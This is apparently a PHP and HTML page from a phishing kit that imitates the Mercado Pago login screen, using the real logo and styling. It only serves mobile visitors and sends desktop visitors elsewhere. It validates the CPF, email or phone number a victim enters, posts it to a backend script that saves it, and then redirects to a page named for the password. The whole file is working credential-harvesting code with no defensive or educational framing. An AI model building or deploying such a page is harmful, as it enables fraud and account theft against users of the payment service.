<?php
// --- LÓGICA INVERTIDA: DETECÇÃO DE DESKTOP ---
// Pega o User Agent do navegador que está acessando a página
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

// Verifica se o User Agent contém strings comuns de dispositivos móveis
$isMobile = preg_match('/(Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone)/i', $userAgent);

// Se NÃO for um dispositivo móvel (ou seja, é um desktop), redireciona para a página principal
if (!$isMobile) {
    header('Location: index.php');
    exit;
}

// Inicia a sessão para uso futuro
session_start();

// --- LÓGICA PARA CRIAR O COOKIE ---
if (!isset($_COOKIE['identificador_cliente'])) {
    $identificadorUnico = uniqid('cliente_', true) . bin2hex(random_bytes(8));
    setcookie('identificador_cliente', $identificadorUnico, time() + (86400 * 30), "/");
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Pago</title>
    <style>
        /* Estilos ajustados para uma melhor visualização em mobile */
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: #fff; }
        .main-header { background-color: #ffe600; padding: 10px 20px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); display: flex; align-items: center; justify-content: flex-start; }
        .main-header img { height: 30px; }
        .main-content { display: flex; flex-direction: column; padding: 24px; box-sizing: border-box; flex-grow: 1; }
        .main-title { font-size: 24px; font-weight: 500; color: #333; line-height: 1.3; text-align: left; margin: 0 0 32px 0; }
        .form-card { width: 100%; }
        .input-label { font-size: 14px; color: #555; margin-bottom: 4px; display: block; font-weight: 400; }
        .input-field { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .input-field:focus { outline: 1px solid #3483fa; border-color: #3483fa; }
        .actions { margin-top: 24px; display: flex; flex-direction: column; gap: 16px; }
        .btn-continue { background-color: #3483fa; color: white; border: none; padding: 16px 24px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; width: 100%; }
        .link-create { color: #3483fa; font-size: 15px; font-weight: 500; text-decoration: none; text-align: center; }
        .main-footer { padding: 24px; font-size: 12px; color: #666; text-align: center; }
        .main-footer a { color: #3483fa; }
        .error-message { color: #d93025; font-size: 12px; text-align: left; margin-top: 4px; min-height: 16px; }
        /* Esconde elementos desnecessários no mobile */
        .left-column { display: none; }
    </style>
</head>
<body>
    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <h1 class="main-title">Digite seu CPF, e-mail ou telefone para iniciar sessão</h1>
        <div class="form-card">
            <form id="login-form">
                <div>
                    <label for="identificador" class="input-label">CPF, e-mail ou telefone</label>
                    <input type="text" id="identificador" class="input-field" autocomplete="off">
                    <div id="error-message" class="error-message"></div>
                </div>
                <div class="actions">
                    <button type="submit" class="btn-continue">Continuar</button>
                    <a href="#" class="link-create">Criar conta</a>
                </div>
            </form>
        </div>
    </main>

    <footer class="main-footer">
        Protegido por reCAPTCHA - <a href="#">Privacidade</a> - <a href="#">Condições</a>
    </footer>

    <script>
        const identificadorInput = document.getElementById('identificador');
        const loginForm = document.getElementById('login-form');
        const errorDiv = document.getElementById('error-message');
        const submitBtn = loginForm.querySelector('.btn-continue');

        // --- BLOCO DA MÁSCARA DE INPUT FOI REMOVIDO ---
        
        // --- FUNÇÕES DE VALIDAÇÃO (INALTERADAS) ---
        const isValidEmail = (email) => {
            const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(String(email).toLowerCase());
        };

        const isValidCPF = (cpf) => {
            cpf = cpf.replace(/\D/g, '');
            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false; 
            let sum = 0, rest;
            for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
            rest = (sum * 10) % 11;
            if ((rest === 10) || (rest === 11)) rest = 0;
            if (rest !== parseInt(cpf.substring(9, 10))) return false;
            sum = 0;
            for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i-1, i)) * (12 - i);
            rest = (sum * 10) % 11;
            if ((rest === 10) || (rest === 11)) rest = 0;
            if (rest !== parseInt(cpf.substring(10, 11))) return false;
            return true;
        };

        const isValidPhone = (phone) => {
            phone = phone.replace(/\D/g, '');
            return phone.length >= 10 && phone.length <= 11;
        };

        // --- LÓGICA DE SUBMISSÃO DO FORMULÁRIO (INALTERADA) ---
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            errorDiv.textContent = '';
            const valor = identificadorInput.value;

            if (!valor) {
                errorDiv.textContent = 'Informe seu e-mail, telefone ou CPF.';
                return;
            }
            
            let eValido = false;
            const apenasNumeros = valor.replace(/\D/g, '');

            if (valor.includes('@')) {
                eValido = isValidEmail(valor);
            } else if (apenasNumeros.length === 11) {
                eValido = isValidCPF(valor) || isValidPhone(valor);
            } else if (apenasNumeros.length === 10) {
                eValido = isValidPhone(valor);
            }

            if (!eValido) {
                errorDiv.textContent = 'Por favor, informe um dado válido.';
                return;
            }
            
            submitBtn.disabled = true;
            submitBtn.textContent = 'Aguarde...';

            try {
                const response = await fetch('api_salvar_identificador.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ identificador: valor })
                });
                const result = await response.json();
                if (result.success) {
                    window.location.href = 'senha.php';
                } else {
                    errorDiv.textContent = result.error || 'Ocorreu um erro. Tente novamente.';
                }
            } catch (error) {
                console.error('Falha na comunicação:', error);
                errorDiv.textContent = 'Não foi possível conectar ao servidor.';
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continuar';
            }
        });
    </script>
</body>
</html>